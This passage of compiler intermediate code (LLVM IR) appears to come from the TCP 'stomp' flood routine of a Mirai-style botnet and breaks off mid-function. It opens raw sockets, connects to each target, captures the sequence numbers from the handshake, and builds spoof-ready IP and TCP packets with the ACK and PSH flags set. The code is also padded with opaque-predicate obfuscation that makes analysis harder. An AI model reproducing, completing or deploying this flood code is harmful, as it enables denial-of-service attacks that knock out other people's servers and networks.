  %91 = load i8, i8* %17, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 12, i32 1)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %30, align 1
  %95 = load i8, i8* %17, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 13, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %31, align 1
  %99 = load i8, i8* %17, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 14, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %32, align 1
  %103 = load i8, i8* %17, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %105 = call i32 @attack_get_opt_int(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 15, i32 0)
  %106 = trunc i32 %105 to i8
  store i8 %106, i8* %33, align 1
  %107 = load i8, i8* %17, align 1
  %108 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %109 = call i32 @attack_get_opt_int(i8 zeroext %107, %struct.attack_option* %108, i8 zeroext 0, i32 768)
  store i32 %109, i32* %34, align 4
  %110 = load i8, i8* %17, align 1
  %111 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %112 = call i32 @attack_get_opt_int(i8 zeroext %110, %struct.attack_option* %111, i8 zeroext 1, i32 1)
  %113 = trunc i32 %112 to i8
  store i8 %113, i8* %35, align 1
  %114 = call i64 @time(i64* null) #6
  %115 = load i32, i32* %14, align 4
  %116 = sext i32 %115 to i64
  %117 = add nsw i64 %114, %116
  %118 = trunc i64 %117 to i32
  store i32 %118, i32* %36, align 4
  %119 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %119, i32* %20, align 4
  %120 = icmp eq i32 %119, -1
  %121 = load i32, i32* @x.27
  %122 = load i32, i32* @y.28
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %120, label %129, label %146

; <label>:129:                                    ; preds = %originalBBpart2
  %130 = load i32, i32* @x.27
  %131 = load i32, i32* @y.28
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %129
  %138 = load i32, i32* @x.27
  %139 = load i32, i32* @y.28
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br label %917

; <label>:146:                                    ; preds = %originalBBpart2
  %147 = load i32, i32* @x.27
  %148 = load i32, i32* @y.28
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %146
  store i32 1, i32* %19, align 4
  %155 = load i32, i32* %20, align 4
  %156 = bitcast i32* %19 to i8*
  %157 = call i32 @setsockopt(i32 %155, i32 0, i32 3, i8* %156, i32 4) #6
  %158 = icmp eq i32 %157, -1
  %159 = load i32, i32* @x.27
  %160 = load i32, i32* @y.28
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br i1 %158, label %167, label %186

; <label>:167:                                    ; preds = %originalBBpart29
  %168 = load i32, i32* @x.27
  %169 = load i32, i32* @y.28
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %167
  %176 = load i32, i32* %20, align 4
  %177 = call i32 @close(i32 %176)
  %178 = load i32, i32* @x.27
  %179 = load i32, i32* @y.28
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %917

; <label>:186:                                    ; preds = %originalBBpart29
  %187 = load i32, i32* @x.27
  %188 = load i32, i32* @y.28
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %186
  store i32 0, i32* %19, align 4
  %195 = load i32, i32* @x.27
  %196 = load i32, i32* @y.28
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %203

; <label>:203:                                    ; preds = %728, %originalBBpart217
  %204 = load i32, i32* %19, align 4
  %205 = load i8, i8* %15, align 1
  %206 = zext i8 %205 to i32
  %207 = icmp slt i32 %204, %206
  br i1 %207, label %208, label %731

; <label>:208:                                    ; preds = %203
  store i32 0, i32* %37, align 4
  br label %209

; <label>:209:                                    ; preds = %originalBBpart257, %originalBBpart249, %208
  %210 = load i32, i32* @x.27
  %211 = load i32, i32* @y.28
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %209
  %218 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %218, i32* %37, align 4
  %219 = icmp eq i32 %218, -1
  %220 = load i32, i32* @x.27
  %221 = load i32, i32* @y.28
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %219, label %228, label %245

; <label>:228:                                    ; preds = %originalBBpart221
  %229 = load i32, i32* @x.27
  %230 = load i32, i32* @y.28
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %228
  %237 = load i32, i32* @x.27
  %238 = load i32, i32* @y.28
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %728

; <label>:245:                                    ; preds = %originalBBpart221
  %246 = load i32, i32* @x.27
  %247 = load i32, i32* @y.28
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %245
  %254 = load i32, i32* %37, align 4
  %255 = load i32, i32* %37, align 4
  %256 = call i32 (i32, i32, ...) @fcntl(i32 %255, i32 3, i32 0)
  %257 = or i32 %256, 2048
  %258 = call i32 (i32, i32, ...) @fcntl(i32 %254, i32 4, i32 %257)
  %259 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 0
  store i16 2, i16* %259, align 4
  %260 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %261 = load i32, i32* %19, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i64 %262
  %264 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %263, i32 0, i32 2
  %265 = load i8, i8* %264, align 4
  %266 = zext i8 %265 to i32
  %267 = icmp slt i32 %266, 32
  %268 = load i32, i32* @x.27
  %269 = load i32, i32* @y.28
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart233, label %originalBB27alteredBB

originalBBpart233:                                ; preds = %originalBB27
  br i1 %267, label %276, label %297

; <label>:276:                                    ; preds = %originalBBpart233
  %277 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %278 = load i32, i32* %19, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %280, i32 0, i32 1
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #7
  %284 = call i32 @rand_next()
  %285 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %286 = load i32, i32* %19, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = lshr i32 %284, %291
  %293 = add i32 %283, %292
  %294 = call i32 @htonl(i32 %293) #7
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  store i32 %294, i32* %296, align 4
  br label %306

; <label>:297:                                    ; preds = %originalBBpart233
  %298 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %299 = load i32, i32* %19, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %298, i64 %300
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i32 0, i32 1
  %303 = load i32, i32* %302, align 4
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %305 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %304, i32 0, i32 0
  store i32 %303, i32* %305, align 4
  br label %306

; <label>:306:                                    ; preds = %297, %276
  %307 = load i16, i16* %27, align 2
  %308 = zext i16 %307 to i32
  %309 = icmp eq i32 %308, 65535
  br i1 %309, label %310, label %315

; <label>:310:                                    ; preds = %306
  %311 = call i32 @rand_next()
  %312 = and i32 %311, 65535
  %313 = trunc i32 %312 to i16
  %314 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  store i16 %313, i16* %314, align 2
  br label %319

; <label>:315:                                    ; preds = %306
  %316 = load i16, i16* %27, align 2
  %317 = call zeroext i16 @htons(i16 zeroext %316) #7
  %318 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  store i16 %317, i16* %318, align 2
  br label %319

; <label>:319:                                    ; preds = %315, %310
  %320 = load i32, i32* %37, align 4
  %321 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %322 = bitcast %struct.sockaddr_in* %38 to %struct.sockaddr*
  store %struct.sockaddr* %322, %struct.sockaddr** %321, align 8
  %323 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %324 = load %struct.sockaddr*, %struct.sockaddr** %323, align 8
  %325 = call i32 @connect(i32 %320, %struct.sockaddr* %324, i32 16)
  %326 = call i64 @time(i64* null) #6
  store i64 %326, i64* %42, align 8
  br label %327

; <label>:327:                                    ; preds = %726, %319
  %328 = load i32, i32* @x.27
  %329 = load i32, i32* @y.28
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %327
  store i32 0, i32* %44, align 4
  store i32 16, i32* %40, align 4
  %336 = load i32, i32* %20, align 4
  %337 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %338 = bitcast %union.__CONST_SOCKADDR_ARG* %45 to %struct.sockaddr**
  %339 = bitcast %struct.sockaddr_in* %39 to %struct.sockaddr*
  store %struct.sockaddr* %339, %struct.sockaddr** %338, align 8
  %340 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %45, i32 0, i32 0
  %341 = load %struct.sockaddr*, %struct.sockaddr** %340, align 8
  %342 = call i64 @recvfrom(i32 %336, i8* %337, i64 256, i32 16384, %struct.sockaddr* %341, i32* %40)
  %343 = trunc i64 %342 to i32
  store i32 %343, i32* %44, align 4
  %344 = load i32, i32* %44, align 4
  %345 = icmp eq i32 %344, -1
  %346 = load i32, i32* @x.27
  %347 = load i32, i32* @y.28
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %345, label %354, label %355

; <label>:354:                                    ; preds = %originalBBpart237
  br label %917

; <label>:355:                                    ; preds = %originalBBpart237
  %356 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %39, i32 0, i32 2
  %357 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %356, i32 0, i32 0
  %358 = load i32, i32* %357, align 4
  %359 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %360 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %359, i32 0, i32 0
  %361 = load i32, i32* %360, align 4
  %362 = icmp eq i32 %358, %361
  br i1 %362, label %363, label %702

; <label>:363:                                    ; preds = %355
  %364 = load i32, i32* @x.27
  %365 = load i32, i32* @y.28
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %363
  %372 = load i32, i32* %44, align 4
  %373 = sext i32 %372 to i64
  %374 = icmp ugt i64 %373, 40
  %375 = load i32, i32* @x.27
  %376 = load i32, i32* @y.28
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %374, label %383, label %702

; <label>:383:                                    ; preds = %originalBBpart241
  %384 = load i32, i32* @x.27
  %385 = load i32, i32* @y.28
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %383
  %392 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %393 = getelementptr inbounds i8, i8* %392, i64 20
  %394 = bitcast i8* %393 to %struct.tcphdr*
  store %struct.tcphdr* %394, %struct.tcphdr** %46, align 8
  %395 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 0
  %397 = load i16, i16* %396, align 4
  %398 = zext i16 %397 to i32
  %399 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  %400 = load i16, i16* %399, align 2
  %401 = zext i16 %400 to i32
  %402 = icmp eq i32 %398, %401
  %403 = load i32, i32* @x.27
  %404 = load i32, i32* @y.28
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br i1 %402, label %411, label %701

; <label>:411:                                    ; preds = %originalBBpart245
  %412 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 4
  %414 = load i16, i16* %413, align 4
  %415 = lshr i16 %414, 9
  %416 = and i16 %415, 1
  %417 = zext i16 %416 to i32
  %418 = icmp ne i32 %417, 0
  br i1 %418, label %419, label %648

; <label>:419:                                    ; preds = %411
  %420 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 4
  %422 = load i16, i16* %421, align 4
  %423 = lshr i16 %422, 12
  %424 = and i16 %423, 1
  %425 = zext i16 %424 to i32
  %426 = icmp ne i32 %425, 0
  br i1 %426, label %427, label %648

; <label>:427:                                    ; preds = %419
  %428 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %429 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %428, i32 0, i32 0
  %430 = load i32, i32* %429, align 4
  %431 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %432 = load i32, i32* %19, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %434, i32 0, i32 0
  store i32 %430, i32* %435, align 4
  %436 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 2
  %438 = load i32, i32* %437, align 4
  %439 = call i32 @ntohl(i32 %438) #7
  %440 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %441 = load i32, i32* %19, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i32 0, i32 1
  store i32 %439, i32* %444, align 4
  %445 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %446 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %445, i32 0, i32 3
  %447 = load i32, i32* %446, align 4
  %448 = call i32 @ntohl(i32 %447) #7
  %449 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %450 = load i32, i32* %19, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %449, i64 %451
  %453 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %452, i32 0, i32 2
  store i32 %448, i32* %453, align 4
  %454 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 1
  %456 = load i16, i16* %455, align 2
  %457 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %458 = load i32, i32* %19, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %457, i64 %459
  %461 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %460, i32 0, i32 3
  store i16 %456, i16* %461, align 4
  %462 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  %463 = load i16, i16* %462, align 2
  %464 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %465 = load i32, i32* %19, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %467, i32 0, i32 4
  store i16 %463, i16* %468, align 2
  %469 = load i32, i32* %34, align 4
  %470 = sext i32 %469 to i64
  %471 = add i64 40, %470
  %472 = call noalias i8* @malloc(i64 %471) #6
  %473 = load i8**, i8*** %22, align 8
  %474 = load i32, i32* %19, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds i8*, i8** %473, i64 %475
  store i8* %472, i8** %476, align 8
  %477 = load i8**, i8*** %22, align 8
  %478 = load i32, i32* %19, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds i8*, i8** %477, i64 %479
  %481 = load i8*, i8** %480, align 8
  %482 = bitcast i8* %481 to %struct.iphdr*
  store %struct.iphdr* %482, %struct.iphdr** %47, align 8
  %483 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i64 1
  %485 = bitcast %struct.iphdr* %484 to %struct.tcphdr*
  store %struct.tcphdr* %485, %struct.tcphdr** %48, align 8
  %486 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i64 1
  %488 = bitcast %struct.tcphdr* %487 to i8*
  store i8* %488, i8** %49, align 8
  %489 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %490 = bitcast %struct.iphdr* %489 to i8*
  %491 = load i8, i8* %490, align 4
  %492 = and i8 %491, 15
  %493 = or i8 %492, 64
  store i8 %493, i8* %490, align 4
  %494 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %495 = bitcast %struct.iphdr* %494 to i8*
  %496 = load i8, i8* %495, align 4
  %497 = and i8 %496, -16
  %498 = or i8 %497, 5
  store i8 %498, i8* %495, align 4
  %499 = load i8, i8* %23, align 1
  %500 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 1
  store i8 %499, i8* %501, align 1
  %502 = load i32, i32* %34, align 4
  %503 = sext i32 %502 to i64
  %504 = add i64 40, %503
  %505 = trunc i64 %504 to i16
  %506 = call zeroext i16 @htons(i16 zeroext %505) #7
  %507 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 2
  store i16 %506, i16* %508, align 2
  %509 = load i16, i16* %24, align 2
  %510 = call zeroext i16 @htons(i16 zeroext %509) #7
  %511 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 3
  store i16 %510, i16* %512, align 4
  %513 = load i8, i8* %25, align 1
  %514 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %515 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %514, i32 0, i32 5
  store i8 %513, i8* %515, align 4
  %516 = load i8, i8* %26, align 1
  %517 = icmp ne i8 %516, 0
  br i1 %517, label %518, label %522

; <label>:518:                                    ; preds = %427
  %519 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %520 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %521 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %520, i32 0, i32 4
  store i16 %519, i16* %521, align 2
  br label %522

; <label>:522:                                    ; preds = %518, %427
  %523 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 6
  store i8 6, i8* %524, align 1
  %525 = load i32, i32* @LOCAL_ADDR, align 4
  %526 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 8
  store i32 %525, i32* %527, align 4
  %528 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %529 = load i32, i32* %19, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %528, i64 %530
  %532 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %531, i32 0, i32 0
  %533 = load i32, i32* %532, align 4
  %534 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 9
  store i32 %533, i32* %535, align 4
  %536 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %537 = load i32, i32* %19, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %539, i32 0, i32 3
  %541 = load i16, i16* %540, align 4
  %542 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i32 0, i32 0
  store i16 %541, i16* %543, align 4
  %544 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %545 = load i32, i32* %19, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %544, i64 %546
  %548 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %547, i32 0, i32 4
  %549 = load i16, i16* %548, align 2
  %550 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %551 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %550, i32 0, i32 1
  store i16 %549, i16* %551, align 2
  %552 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %553 = load i32, i32* %19, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %552, i64 %554
  %556 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %555, i32 0, i32 2
  %557 = load i32, i32* %556, align 4
  %558 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %559 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %558, i32 0, i32 2
  store i32 %557, i32* %559, align 4
  %560 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %561 = load i32, i32* %19, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %560, i64 %562
  %564 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %563, i32 0, i32 1
  %565 = load i32, i32* %564, align 4
  %566 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %567 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %566, i32 0, i32 3
  store i32 %565, i32* %567, align 4
  %568 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 4
  %570 = load i16, i16* %569, align 4
  %571 = and i16 %570, -241
  %572 = or i16 %571, 128
  store i16 %572, i16* %569, align 4
  %573 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %574 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %573, i32 0, i32 4
  %575 = load i16, i16* %574, align 4
  %576 = and i16 %575, -257
  %577 = or i16 %576, 256
  store i16 %577, i16* %574, align 4
  %578 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 4
  %580 = load i16, i16* %579, align 4
  %581 = and i16 %580, -4097
  %582 = or i16 %581, 4096
  store i16 %582, i16* %579, align 4
  %583 = call i32 @rand_next()
  %584 = and i32 %583, 65535
  %585 = trunc i32 %584 to i16
  %586 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 5
  store i16 %585, i16* %587, align 2
  %588 = load i8, i8* %28, align 1
  %589 = sext i8 %588 to i16
  %590 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
